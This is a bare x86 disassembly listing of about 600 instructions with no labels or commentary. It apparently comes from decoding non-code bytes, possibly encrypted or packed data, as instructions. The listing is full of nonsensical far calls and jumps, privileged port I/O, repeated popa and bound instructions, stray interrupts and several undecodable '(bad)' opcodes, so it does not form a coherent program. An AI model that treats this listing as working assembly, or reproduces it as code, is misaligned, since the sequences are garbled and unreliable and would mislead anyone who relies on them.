  435400:	mov    dl,0x3b
  435402:	or     eax,0x75176975
  435407:	push   ebp
  435408:	or     eax,0xb856975
  43540d:	call   0x9a0b:0x85a23ac9
  435414:	leave  
  435415:	cmp    dl,BYTE PTR [edi]
  435417:	jne    0x435482
  435419:	out    dx,al
  43541a:	adc    esi,edx
  43541c:	jmp    0xe769:0x1e22f55
  435423:	ror    DWORD PTR ds:0xb855575,1
  435429:	call   0x61cc:0x34273ac9
  435430:	popa   
  435431:	or     eax,0x17949aa5
  435436:	adc    BYTE PTR [eax+0x61ce1b4b],bl
  43543c:	or     eax,0xb855575
  435441:	call   0x939a:0xcd0d3ac9
  435448:	repnz outs dx,BYTE PTR ds:[esi]
  43544a:	cdq    
  43544b:	dec    ebx
  43544c:	sbb    ecx,esi
  43544e:	popa   
  43544f:	test   DWORD PTR [edx],ecx
  435451:	sbb    ah,BYTE PTR [ecx+0x61]
  435454:	xor    al,0xb9
  435456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435457:	popa   
  435458:	popa   
  435459:	or     eax,0x6fd655cd
  43545e:	or     ebx,DWORD PTR [edx-0x5af2c537]
  435464:	call   0x1b4b:0xd06e1794
  43546b:	into   
  43546c:	popa   
  43546d:	or     eax,0x22579a75
  435472:	mul    DWORD PTR [ecx-0x5b]
  435475:	or     eax,0x21c9c964
  43547a:	jne    0x4354d1
  43547c:	das    
  43547d:	loop   0x435480
  43547f:	imul   esp,DWORD PTR [ecx],0xe2ad6975
  435485:	add    DWORD PTR [ecx+0x62],ebp
  435488:	mov    dl,0x9a
  43548a:	repz mov ecx,0x17626263
  435490:	jne    0x43542c
  435492:	or     eax,0xb856975
  435497:	call   0x939a:0xcd0d3ac9
  43549e:	repnz outs dx,BYTE PTR ds:[esi]
  4354a0:	cdq    
  4354a1:	dec    ebx
  4354a2:	sbb    ecx,esi
  4354a4:	popa   
  4354a5:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4354ab:	repnz sbb al,0x85
  4354ae:	or     bl,BYTE PTR [edx]
  4354b0:	popa   
  4354b1:	popa   
  4354b2:	xchg   ebx,eax
  4354b3:	repnz sbb al,0x9d
  4354b6:	xor    al,0xcc
  4354b8:	popa   
  4354b9:	popa   
  4354ba:	out    0x9f,eax
  4354bc:	or     eax,0xb856975
  4354c1:	call   0x939a:0xcd0d3ac9
  4354c8:	repnz outs dx,BYTE PTR ds:[esi]
  4354ca:	cdq    
  4354cb:	dec    ebx
  4354cc:	sbb    ecx,esi
  4354ce:	popa   
  4354cf:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  4354d5:	repnz sbb al,0x85
  4354d8:	or     bl,BYTE PTR [edx]
  4354da:	popa   
  4354db:	popa   
  4354dc:	xchg   ebx,eax
  4354dd:	repnz sbb al,0x9d
  4354e0:	retf   
  4354e1:	int3   
  4354e2:	popa   
  4354e3:	popa   
  4354e4:	mov    dl,0x3b
  4354e6:	or     eax,0x75176975
  4354eb:	push   ebp
  4354ec:	or     eax,0xb856975
  4354f1:	call   0x9a0b:0x85a23ac9
  4354f8:	leave  
  4354f9:	cmp    dl,BYTE PTR [edi]
  4354fb:	jne    0x435566
  4354fd:	out    dx,al
  4354fe:	add    eax,0x2f55ead6
  435503:	loop   0x435506
  435505:	imul   esp,edi,0xa21caf34
  43550b:	out    dx,al
  43550c:	pop    edi
  43550d:	scas   eax,DWORD PTR es:[edi]
  43550e:	sbb    al,0x57
  435510:	and    dh,bh
  435512:	popa   
  435513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435514:	or     eax,0x750dc964
  435519:	call   0x8675:0xd557517
  435520:	xchg   ebx,eax
  435521:	repnz popa 
  435523:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435529:	repnz sbb al,0x85
  43552c:	or     bl,BYTE PTR [edx]
  43552e:	popa   
  43552f:	popa   
  435530:	xchg   ebx,eax
  435531:	repnz sbb al,0x9d
  435534:	xor    al,0xcc
  435536:	popa   
  435537:	popa   
  435538:	out    0x7c,eax
  43553a:	or     eax,0xcd0d9a75
  43553f:	xchg   BYTE PTR [ebp+ecx*1-0x65e86b6f],dl
  435546:	or     eax,0xa2a29a75
  43554b:	pop    ss
  43554c:	jne    0x4354e8
  43554e:	or     eax,0xa2a28675
  435553:	pop    ss
  435554:	jne    0x4354dc
  435556:	out    dx,al
  435557:	hlt    
  435558:	scas   eax,DWORD PTR es:[edi]
  435559:	sbb    al,0xd
  43555b:	int    0x9a
  43555d:	xchg   esp,eax
  43555e:	pop    ss
  43555f:	push   0x5755750d
  435564:	and    bl,BYTE PTR [edx+0x640da561]
  43556a:	fsub   DWORD PTR [edx+ecx*4+0x21]
  43556e:	jne    0x4355d4
  435570:	lods   eax,DWORD PTR ds:[esi]
  435571:	loop   0x435574
  435573:	imul   esp,DWORD PTR [ecx],0xe225f375
  435579:	add    DWORD PTR [ecx+0xd],ebp
  43557c:	jne    0x4355e2
  43557e:	test   DWORD PTR [ebx],ecx
  435580:	call   0xa8e8:0x5e343ac9
  435587:	popa   
  435588:	pop    ss
  435589:	jne    0x4355f4
  43558b:	and    DWORD PTR [ebp+0x31],esi
  43558e:	adc    al,0xe2
  435590:	add    DWORD PTR [ecx+0x21],ebp
  435593:	jne    0x4355f2
  435595:	and    dl,ah
  435597:	add    DWORD PTR [ecx+0x21],ebp
  43559a:	jne    0x4355f1
  43559c:	mov    bl,0xe2
  43559e:	add    DWORD PTR [ecx+0xd],ebp
  4355a1:	jne    0x435607
  4355a3:	test   DWORD PTR [ebx],ecx
  4355a5:	call   0x1369:0xcd0d3ac9
  4355ac:	outs   dx,BYTE PTR ds:[esi]
  4355ad:	push   0x61a8e85e
  4355b2:	or     eax,0x6fd6f3cd
  4355b7:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4355bd:	pop    esi
  4355be:	call   0xa550b76b
  4355c3:	xchg   edx,eax
  4355c4:	xchg   ebx,eax
  4355c5:	mov    edx,0x9322a74f
  4355ca:	fsubr  st,st(4)
  4355cc:	popa   
  4355cd:	popa   
  4355ce:	popa   
  4355cf:	or     eax,0xcd0d9275
  4355d4:	imul   ebp,DWORD PTR ds:0x31cd0d1f,0x9a0b6fd6
  4355de:	leave  
  4355df:	cmp    dl,dh
  4355e1:	pop    ds
  4355e2:	pop    esi
  4355e3:	call   0x1feab790
  4355e8:	lds    esi,FWORD PTR [edx+0xd]
  4355eb:	jne    0x435587
  4355ed:	push   esi
  4355ee:	jne    0x435659
  4355f0:	or     eax,0xcd5686cd
  4355f5:	imul   ecx,DWORD PTR ds:0xd921789,0xda17f7d1
  4355ff:	test   DWORD PTR ds:0xb853175,0xd3ac99a
  435609:	int    0x69
  43560b:	adc    ebp,DWORD PTR [esi+0x68]
  43560e:	pop    esi
  43560f:	call   0x755ab7bc
  435614:	imul   esi,eax,0x616161fc
  43561a:	or     eax,0xcd0d9275
  43561f:	imul   ebp,DWORD PTR ds:0x5dcd0d1f,0x9a0b6fd6
  435629:	leave  
  43562a:	cmp    dl,dh
  43562c:	pop    ds
  43562d:	pop    esi
  43562e:	call   0x1feab7db
  435633:	lds    eax,FWORD PTR [edx]
  435635:	or     eax,0x75569a75
  43563a:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x17910d69
  435644:	call   0x9a0b:0x855d750d
  43564b:	leave  
  43564c:	cmp    cl,BYTE PTR ds:0x6e1369cd
  435652:	push   0x61a8e85e
  435657:	pop    ss
  435658:	jne    0x4356c3
  43565a:	out    dx,al
  43565b:	(bad)  
  43565c:	or     eax,0xcd0d9275
  435661:	imul   ebp,DWORD PTR ds:0x55cd0d1f,0x9a0b6fd6
  43566b:	leave  
  43566c:	cmp    dl,dh
  43566e:	pop    ds
  43566f:	pop    esi
  435670:	call   0x1feab81d
  435675:	lds    esi,FWORD PTR [edi]
  435677:	or     eax,0x75569a75
  43567c:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x910d9469
  435686:	xchg   esp,eax
  435687:	pop    ss
  435688:	call   0x9a0b:0x8555750d
  43568f:	leave  
  435690:	cmp    cl,BYTE PTR ds:0x6e1369cd
  435696:	push   0x61a8e85e
  43569b:	pop    ss
  43569c:	jne    0x435707
  43569e:	out    dx,al
  43569f:	mov    ecx,DWORD PTR ds:0x75569a75
  4356a5:	imul   ecx,DWORD PTR ds:0xcd5686cd,0x4911a69
  4356af:	call   0x7517:0xa269750d
  4356b6:	imul   esi,eax,0x62626318
  4356bc:	push   edi
  4356bd:	and    al,BYTE PTR [esi+0x640da561]
  4356c3:	fsub   DWORD PTR [edx+edx*4+0x21]
  4356c7:	jne    0x43571e
  4356c9:	lods   eax,DWORD PTR ds:[esi]
  4356ca:	loop   0x4356cd
  4356cc:	imul   esp,DWORD PTR [ecx],0xe2256975
  4356d2:	add    DWORD PTR [ecx+0xd],ebp
  4356d5:	jne    0x43572c
  4356d7:	test   DWORD PTR [ebx],ecx
  4356d9:	call   0xa8e8:0x5e343ac9
  4356e0:	popa   
  4356e1:	mov    eax,ds:0xd3e78675
  4356e6:	or     eax,0xb856975
  4356eb:	call   0xa8e8:0x5e343ac9
  4356f2:	popa   
  4356f3:	or     eax,0x602d86cd
  4356f8:	pop    ss
  4356f9:	int    0x86
  4356fb:	adc    esi,DWORD PTR [ebp+0x31]
  4356fe:	pop    ss
  4356ff:	jne    0x43575e
  435701:	or     eax,0x5e338675
  435706:	call   0xbc8b8b3
  43570b:	call   0x175d:0xcd0d3ac9
  435712:	push   0x8555750d
  435717:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43571d:	call   0xcd50b8ca
  435722:	xor    esi,edx
  435724:	outs   dx,DWORD PTR ds:[esi]
  435725:	or     ebx,DWORD PTR [edx-0x5af2c537]
  43572b:	call   0xa8e8:0x5e906e04
  435732:	popa   
  435733:	out    dx,al
  435734:	or     DWORD PTR [edi+0x22],edx
  435737:	call   0x64d6:0x640da561
  43573e:	sahf   
  43573f:	pop    edi
  435740:	popa   
  435741:	popa   
  435742:	and    edx,esp
  435744:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  435748:	lods   eax,DWORD PTR ds:[esi]
  435749:	loop   0x43574c
  43574b:	imul   esp,DWORD PTR [ecx],0x625c4ce2
  435751:	bound  esp,QWORD PTR ds:0xd6901e2
  435757:	jne    0x4356eb
  435759:	pop    ss
  43575a:	loop   0x435798
  43575c:	pop    esp
  43575d:	bound  esp,QWORD PTR [edx+0xd]
  435760:	loop   0x43578a
  435762:	pop    esp
  435763:	bound  esp,QWORD PTR [edx-0x7b]
  435766:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43576c:	call   0x75eab919
  435771:	call   0x5c28:0xe20d6bb2
  435778:	bound  esp,QWORD PTR [edx-0x7b]
  43577b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435781:	call   0xdb33b92e
  435786:	push   0xe20d6161
  43578b:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  43578f:	test   DWORD PTR [ebx],ecx
  435791:	call   0xa8e8:0x5e343ac9
  435798:	popa   
  435799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43579a:	jne    0x435722
  43579c:	mov    dl,0x6b
  43579e:	or     eax,0x625c28e2
  4357a3:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4357a9:	xor    al,0x5e
  4357ab:	call   0x7d33b958
  4357b0:	push   0x75136161
  4357b5:	push   ebp
  4357b6:	pop    ss
  4357b7:	loop   0x4357d1
  4357b9:	pop    esp
  4357ba:	bound  esp,QWORD PTR [edx+0xd]
  4357bd:	loop   0x4357d7
  4357bf:	pop    esp
  4357c0:	bound  esp,QWORD PTR [edx+0x13]
  4357c3:	adc    esi,DWORD PTR [ecx]
  4357c5:	pop    esp
  4357c6:	bound  esp,QWORD PTR [edx+0x17]
  4357c9:	call   0x6262:0x5c58e213
  4357d0:	pop    ss
  4357d1:	jne    0x43583c
  4357d3:	or     eax,0xcd0d6975
  4357d8:	xchg   BYTE PTR [edi],dl
  4357da:	call   0x6262:0x5c28e20d
  4357e1:	test   DWORD PTR [ebx],ecx
  4357e3:	call   0xa8e8:0x5e343ac9
  4357ea:	popa   
  4357eb:	pop    ss
  4357ec:	loop   0x43583e
  4357ee:	pop    esp
  4357ef:	bound  esp,QWORD PTR [edx+0x62]
  4357f2:	mov    dl,0x86
  4357f4:	repz loopne 0x43584c
  4357f7:	bound  esp,QWORD PTR [edx+0x17]
  4357fa:	loop   0x435844
  4357fc:	pop    esp
  4357fd:	bound  esp,QWORD PTR [edx+0xd]
  435800:	jne    0x43579c
  435802:	or     eax,0xe2177ea2
  435807:	repz pop esp
  435809:	bound  esp,QWORD PTR [edx+0xd]
  43580c:	jne    0x4357a8
  43580e:	fcomp  DWORD PTR [esi+edi*2]
  435811:	mov    eax,ds:0x625cf3e2
  435816:	bound  edx,QWORD PTR [ebx+0x6161546e]
  43581c:	popa   
  43581d:	or     eax,0x625cf3e2
  435822:	(bad)  
  435823:	fdiv   st,st(3)
  435825:	call   0x6262:0x5c64e217
  43582c:	or     eax,0x625c64e2
  435831:	bound  esp,QWORD PTR [edx-0x15]
  435834:	cmp    bl,dh
  435836:	push   es
  435837:	bound  esp,QWORD PTR [bp+si+0x17]
  43583b:	loop   0x43588d
  43583d:	pop    esp
  43583e:	bound  esp,QWORD PTR [edx+0x62]
  435841:	or     edx,DWORD PTR [eax+0x5c]
  435844:	bound  esp,QWORD PTR [edx+0x62]
  435847:	mov    dl,0x55
  435849:	repz hlt 
  43584b:	push   ebp
  43584c:	bound  esp,QWORD PTR [edx+0xd]
  43584f:	loop   0x435879
  435851:	pop    esp
  435852:	bound  esp,QWORD PTR [edx-0x7b]
  435855:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43585b:	call   0xe2eaba08
  435860:	dec    eax
  435861:	pop    esp
  435862:	bound  esp,QWORD PTR [edx-0x4e]
  435865:	call   0x5ed4:0xf355b262
  43586c:	bound  esp,QWORD PTR [edx+0xd]
  43586f:	loop   0x4358bd
  435871:	pop    esp
  435872:	bound  esp,QWORD PTR [edx-0x7b]
  435875:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43587b:	call   0x6315ba28
  435880:	or     ebx,DWORD PTR [eax+0x5c]
  435883:	bound  esp,QWORD PTR [edx+0x62]
  435886:	mov    dl,0x55
  435888:	repz cmp cl,BYTE PTR [edx+0x62]
  43588c:	bound  ecx,QWORD PTR ds:0x625c2813
  435892:	(bad)  
  435893:	(bad)  
  435894:	outs   dx,DWORD PTR ds:[esi]
  435895:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43589b:	pop    esi
  43589c:	call   0x1feaba49
  4358a1:	mov    dl,0x97
  4358a3:	or     eax,0x625c64e2
  4358a8:	bound  ecx,QWORD PTR ds:0x7fee8aa2
  4358ae:	or     eax,0x625cf3e2
  4358b3:	bound  ecx,QWORD PTR ds:0xf3e21761
  4358b9:	pop    esp
  4358ba:	bound  esp,QWORD PTR [edx-0x10]
  4358bd:	shl    BYTE PTR [edx+0x62],1
  4358c0:	bound  ecx,QWORD PTR ds:0x625c28e2
  4358c6:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4358cc:	xor    al,0x5e
  4358ce:	call   0x229aba7b
  4358d3:	xchg   BYTE PTR [ecx-0x5b],ah
  4358d6:	or     eax,0x7e64d864
  4358db:	or     eax,0x75179275
  4358e0:	imul   ebx,eax,0xe7619aea
  4358e6:	cmp    ebx,eax
  4358e8:	jmp    0x1caf:0x3ab26186
  4358ef:	lock mov eax,ds:0xaf616168
  4358f5:	sbb    al,0x94
  4358f7:	pop    ss
  4358f8:	jne    0x43592b
  4358fa:	fcom   DWORD PTR [ebp+0x1caf615d]
  435900:	mov    ds:0x68616e93,al
  435905:	popa   
  435906:	popa   
  435907:	and    DWORD PTR [ebp+0x55],esi
  43590a:	fisub  WORD PTR [ecx+0x61]
  43590d:	popa   
  43590e:	scas   eax,DWORD PTR es:[edi]
  43590f:	sbb    al,0x94
  435911:	pop    ss
  435912:	jne    0x435978
  435914:	out    dx,al
  435915:	xchg   BYTE PTR [ebp+ecx*1-0x276b9b8b],dl
  43591c:	sbb    al,0x68
  43591e:	xchg   esp,eax
  43591f:	pop    ss
  435920:	jne    0x435986
  435922:	xchg   ebx,eax
  435923:	bnd jne 0x43598a
  435926:	or     eax,0xf29386cd
  43592b:	sar    ebx,1
  43592d:	(bad)  
  43592e:	outs   dx,DWORD PTR ds:[esi]
  43592f:	or     bl,BYTE PTR [edx]
  435931:	popa   
  435932:	popa   
  435933:	(bad)  
  435934:	pop    ds
  435935:	mov    ecx,0x936161a7
  43593a:	repnz push edi
  43593c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43593d:	pop    ds
  43593e:	xchg   ebx,eax
  43593f:	adc    edx,DWORD PTR [ecx]
  435941:	popa   
  435942:	popa   
  435943:	popa   
  435944:	xchg   ebx,eax
  435945:	bnd jne 0x4359ac
  435948:	or     eax,0xf29386cd
  43594d:	sub    al,0xd6
  43594f:	pop    edi
  435950:	xchg   ebx,eax
  435951:	repnz int 0x31
  435954:	(bad)  
  435955:	lock mov ecx,0x936161a7
  43595b:	repnz push edi
  43595d:	(bad)  
  43595e:	outs   dx,DWORD PTR ds:[esi]
  43595f:	or     bl,BYTE PTR [edx]
  435961:	popa   
  435962:	popa   
  435963:	xchg   ebx,eax
  435964:	repnz push edi
  435966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435967:	pop    ds
  435968:	out    0x5f,eax
  43596a:	out    dx,al
  43596b:	mov    ebx,0x6475f293
  435970:	or     eax,0xf29386cd
  435975:	not    esi
  435977:	popf   
  435978:	xor    al,0xcc
  43597a:	popa   
  43597b:	popa   
  43597c:	mov    dl,0x93
  43597e:	xchg   ebx,eax
  43597f:	bnd jne 0x4359b3
  435982:	or     eax,0x1e939acd
  435987:	imul   DWORD PTR [eax-0x1e]
  43598a:	sbb    al,0xe7
  43598c:	jb     0x435921
  43598e:	bnd jne 0x4359f5
  435991:	or     eax,0xf29386cd
  435996:	not    esi
  435998:	xchg   ebx,eax
  435999:	repnz int 0x31
  43599c:	or     eax,0x93949aa5
  4359a1:	push   ds
  4359a2:	xchg   BYTE PTR [eax-0x29a80d6d],dl
  4359a8:	lock mov ecx,0x936161a7
  4359ae:	repnz push edi
  4359b0:	(bad)  
  4359b1:	outs   dx,DWORD PTR ds:[esi]
  4359b2:	or     bl,BYTE PTR [edx]
  4359b4:	popa   
  4359b5:	popa   
  4359b6:	xchg   ebx,eax
  4359b7:	repnz push edi
  4359b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359ba:	pop    ds
  4359bb:	mov    dl,0x88
  4359bd:	and    DWORD PTR [ebp+0x55],esi
  4359c0:	loope  0x435a23
  4359c2:	popa   
  4359c3:	popa   
  4359c4:	or     eax,0x17a25d75
  4359c9:	jne    0x435a28
  4359cb:	out    dx,al
  4359cc:	mov    esi,gs
  4359ce:	cmp    ah,BYTE PTR [ecx]
  4359d0:	jne    0x435a27
  4359d2:	loopne 0x435a35
  4359d4:	popa   
  4359d5:	popa   
  4359d6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359d8:	bound  esp,QWORD PTR [edx+0x62]
  4359db:	xchg   ebx,eax
  4359dc:	bnd jne 0x435a10
  4359df:	or     eax,0x1e939acd
  4359e4:	imul   DWORD PTR [eax-0x1e]
  4359e7:	sbb    al,0xb2
  4359e9:	pop    edi
  4359ea:	out    dx,al
  4359eb:	xchg   DWORD PTR [ebp+ecx*1-0x276bce8b],edx
  4359f2:	sbb    al,0x68
  4359f4:	xchg   esp,eax
  4359f5:	pop    ss
  4359f6:	jne    0x435a29
  4359f8:	fsubr  st,st(2)
  4359fa:	push   ebp
  4359fb:	loopne 0x4359af
  4359fd:	imul   DWORD PTR [edi-0xfd211e4]
  435a03:	dec    edx
  435a04:	arpl   WORD PTR [edx+0x62],sp
  435a07:	xchg   ebx,eax
  435a08:	bnd jne 0x435a68
  435a0b:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435a11:	repnz sbb al,0x85
  435a14:	or     bl,BYTE PTR [edx]
  435a16:	popa   
  435a17:	popa   
  435a18:	xchg   ebx,eax
  435a19:	repnz sbb al,0xd
  435a1c:	int    0x86
  435a1e:	xchg   ebx,eax
  435a1f:	repnz sar ebx,1
  435a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435a23:	pop    ds
  435a24:	out    0xf7,eax
  435a26:	scas   eax,DWORD PTR es:[edi]
  435a27:	sbb    al,0xee
  435a29:	push   esi
  435a2a:	scas   eax,DWORD PTR es:[edi]
  435a2b:	sbb    al,0xa2
  435a2d:	push   edi
  435a2e:	and    al,BYTE PTR [esi+0x640da561]
  435a34:	fsub   DWORD PTR [esi+eiz*8+0xd]
  435a38:	jne    0x435ab8
  435a3a:	pop    ss
  435a3b:	jne    0x435aa6
  435a3d:	or     eax,0xdb0d6975
  435a42:	and    al,0x68
  435a44:	popa   
  435a45:	popa   
  435a46:	fsubr  DWORD PTR [edx+0xd88b261]
  435a4c:	jne    0x4359e8
  435a4e:	test   DWORD PTR [ebx],ecx
  435a50:	call   0xa8e8:0x5e343ac9
  435a57:	popa   
  435a58:	lock int 0x5f
  435a5b:	popa   
  435a5c:	popa   
  435a5d:	jo     0x435a05
  435a5f:	bound  esi,QWORD PTR [edx+0x55c1f392]
  435a65:	bound  esp,QWORD PTR [edx+0xd]
  435a68:	jne    0x435ad3
  435a6a:	pop    ss
  435a6b:	jne    0x435ab9
  435a6d:	or     eax,0x1cd86975
  435a72:	js     0x435a8b
  435a74:	jne    0x435ace
  435a76:	or     eax,0x1cd86975
  435a7b:	sub    al,0x17
  435a7d:	jne    0x435aa7
  435a7f:	or     eax,0x1cd86975
  435a84:	xchg   esp,eax
  435a85:	pop    ss
  435a86:	jne    0x435ad8
  435a88:	or     eax,0x4346975
  435a8d:	popa   
  435a8e:	popa   
  435a8f:	popa   
  435a90:	pop    ss
  435a91:	jne    0x435acf
  435a93:	or     eax,0xbb346975
  435a98:	popa   
  435a99:	popa   
  435a9a:	popa   
  435a9b:	pop    ss
  435a9c:	jne    0x435ae6
  435a9e:	or     eax,0x4c346975
  435aa3:	popa   
  435aa4:	popa   
  435aa5:	popa   
  435aa6:	pop    ss
  435aa7:	jne    0x435ac1
  435aa9:	or     eax,0xed346975
  435aae:	popa   
  435aaf:	popa   
  435ab0:	popa   
  435ab1:	pop    ss
  435ab2:	jne    0x435aa7
  435ab4:	or     eax,0x92346975
  435ab9:	push   0x75176161
  435abe:	fs or  eax,0xa8346975
  435ac4:	push   0x75176161
  435ac9:	xor    DWORD PTR ds:0xbe346975,ecx
  435acf:	push   0x75176161
  435ad4:	pop    ebp
  435ad5:	or     eax,0xb859a75
  435ada:	call   0xa8e8:0x5e343ac9
  435ae1:	popa   
  435ae2:	pop    ss
  435ae3:	jne    0x435b3a
  435ae5:	bound  esi,QWORD PTR [edx+0x6261707e]
  435aeb:	mov    dl,0x69
  435aed:	or     eax,0xad626975
  435af2:	mov    cl,0x68
  435af4:	popa   
  435af5:	popa   
  435af6:	repz push ebp
  435af8:	push   0xdd26161
  435afd:	jne    0x435b68
  435aff:	or     eax,0x616824db
  435b04:	popa   
  435b05:	bound  esi,QWORD PTR [edx-0xd]
  435b08:	xor    edx,DWORD PTR [ebp+0x62]
  435b0b:	bound  edx,QWORD PTR [edi]
  435b0d:	jne    0x435b64
  435b0f:	or     eax,0xb859a75
  435b14:	call   0xa8e8:0x5e343ac9
  435b1b:	popa   
  435b1c:	mov    eax,ds:0x6e935575
  435b21:	fldcw  WORD PTR [eax+0x61]
  435b24:	popa   
  435b25:	or     eax,0xcd0d5575
  435b2a:	push   ebp
  435b2b:	push   esi
  435b2c:	ficom  DWORD PTR [esi+0xd1ccd17]
  435b32:	jne    0x435b50
  435b34:	or     eax,0xda5655cd
  435b39:	jecxz  0x435b52
  435b3b:	int    0xfd
  435b3d:	or     eax,0xcd0dfd75
  435b42:	push   ebp
  435b43:	push   esi
  435b44:	fidiv  DWORD PTR [esi+0x17]
  435b47:	int    0xf9
  435b49:	or     eax,0xcd0dfd75
  435b4e:	push   ebp
  435b4f:	push   esi
  435b50:	(bad)  
  435b52:	pop    ss
  435b53:	int    0x54
  435b55:	or     eax,0xa20dfd75
  435b5a:	mov    ss,WORD PTR [esi+0x75]
  435b5d:	push   ebp
  435b5e:	pop    ss
  435b5f:	jne    0x435b75
  435b61:	or     eax,0xcd0dfd75
  435b66:	std    
  435b67:	or     eax,0x99a77ea2
  435b6c:	mov    al,ch
  435b6e:	xchg   edi,eax
  435b6f:	or     eax,0xa20dfd75
  435b74:	jle    0x435b8d
  435b76:	jne    0x435b61
  435b78:	out    dx,al
  435b79:	xchg   ecx,eax
  435b7a:	or     eax,0xa20dfd75
  435b7f:	mov    dl,BYTE PTR [edi]
  435b81:	jne    0x435b6c
  435b83:	or     eax,0x7517e975
  435b88:	and    al,0xd
  435b8a:	jne    0x435b26
  435b8c:	test   DWORD PTR [ebx],ecx
  435b8e:	call   0xa8e8:0x5e343ac9
  435b95:	popa   
  435b96:	pop    ss
  435b97:	jne    0x435b4a
  435b99:	and    DWORD PTR [ebp+0x20],esi
  435b9c:	xchg   edi,eax
  435b9d:	popa   
  435b9e:	popa   
  435b9f:	popa   
  435ba0:	or     eax,0xb859a75
  435ba5:	call   0xa8e8:0x5e343ac9
  435bac:	popa   
  435bad:	pop    ss
  435bae:	jne    0x435bb1
  435bb0:	out    dx,al
  435bb1:	imul   ecx,DWORD PTR ds:0xb858675,0xffffff9a
  435bb8:	leave  
  435bb9:	cmp    cl,BYTE PTR ds:0x6e1301cd
  435bbf:	push   0x61a8e85e
  435bc4:	pop    ss
  435bc5:	jne    0x435bc8
  435bc7:	or     eax,0x75a70175
  435bcc:	and    al,0x93
  435bce:	fsubr  DWORD PTR [eax]
  435bd0:	popa   
  435bd1:	popa   
  435bd2:	popa   
  435bd3:	or     eax,0x75a7b175
  435bd8:	and    al,ch
  435bda:	xor    al,0xf0
  435bdc:	and    DWORD PTR [ecx+0x61],esp
  435bdf:	popa   
  435be0:	or     eax,0xcd0d0175
  435be5:	adc    al,0x93
  435be7:	repnz neg DWORD PTR [ecx+0xd607517]
  435bee:	jne    0x435bed
  435bf0:	or     eax,0xdaa701cd
  435bf5:	mov    dh,BYTE PTR [ebx-0x69]
  435bf8:	or     eax,0xcd0dfd75
  435bfd:	pusha  
  435bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435bff:	fidivr DWORD PTR [esi-0x18]
  435c02:	xor    al,0xf0
  435c04:	or     DWORD PTR [ecx+0x61],esp
  435c07:	popa   
  435c08:	or     eax,0xcd0d0175
  435c0d:	push   esp
  435c0e:	or     eax,0x7e5655a5
  435c13:	(bad)  
  435c14:	pop    ss
  435c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c16:	or     BYTE PTR ds:0xcd0d6075,cl
  435c1c:	stc    
  435c1d:	or     eax,0x7e5655a5
  435c22:	(bad)  
  435c23:	pop    ss
  435c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c25:	lods   eax,DWORD PTR ds:[esi]
  435c26:	or     eax,0xb859a75
  435c2b:	call   0xa8e8:0x5e343ac9
  435c32:	popa   
  435c33:	pop    ss
  435c34:	jne    0x435c2b
  435c36:	out    dx,al
  435c37:	imul   ecx,DWORD PTR ds:0xb858675,0xffffff9a
  435c3e:	leave  
  435c3f:	cmp    cl,BYTE PTR ds:0x6e13f5cd
  435c45:	push   0x61a8e85e
  435c4a:	pop    ss
  435c4b:	jne    0x435c42
  435c4d:	or     eax,0x75a7f575
  435c52:	and    BYTE PTR [ebx-0x33],dh
  435c55:	or     eax,0xb859a75
  435c5a:	call   0xa8e8:0x5e343ac9
  435c61:	popa   
  435c62:	or     eax,0xa50df5cd
  435c67:	xchg   edx,eax
  435c68:	mov    eax,ds:0x5fe71af7
  435c6d:	out    dx,al
  435c6e:	push   edi
  435c6f:	bound  esi,QWORD PTR [edx-0xa8af297]
  435c75:	(bad)  
  435c76:	out    0xe2,eax
  435c78:	dec    esp
  435c79:	bound  esi,QWORD PTR [edx+0x55bef308]
  435c7f:	bound  esp,QWORD PTR [edx+0xd]
  435c82:	int    0x9a
  435c84:	(bad)  
  435c85:	outs   dx,DWORD PTR ds:[esi]
  435c86:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435c8c:	pop    esi
  435c8d:	call   0x1feabe3a
  435c92:	out    0x86,eax
  435c94:	or     eax,0xcd0df575
  435c99:	xchg   edx,eax
  435c9a:	or     eax,0x7e17ada5
  435c9f:	(bad)  
  435ca0:	out    dx,al
  435ca1:	out    dx,eax
  435ca2:	lock xchg edi,eax
  435ca4:	bound  esp,QWORD PTR [edx+0x62]
  435ca7:	or     eax,0x22575575
  435cac:	xchg   edx,eax
  435cad:	popa   
  435cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435caf:	or     eax,0x750dc964
  435cb4:	call   0x9ab2:0x62557517
  435cbb:	or     eax,0xad625575
  435cc0:	dec    eax
  435cc1:	push   0x257a6161
  435cc6:	loop   0x435cc9
  435cc8:	imul   edi,DWORD PTR [edx-0x53],0xf36901e2
  435ccf:	mov    esp,0xd62625c
  435cd4:	int    0x55
  435cd6:	or     eax,0x6168f517
  435cdb:	popa   
  435cdc:	pop    ss
  435cdd:	push   0xd55750d
  435ce2:	fcomi  st,st(5)
  435ce4:	push   0xaad86161
  435ce9:	popa   
  435cea:	out    0x34,eax
  435cec:	scas   eax,DWORD PTR es:[edi]
  435ced:	sbb    al,0xa2
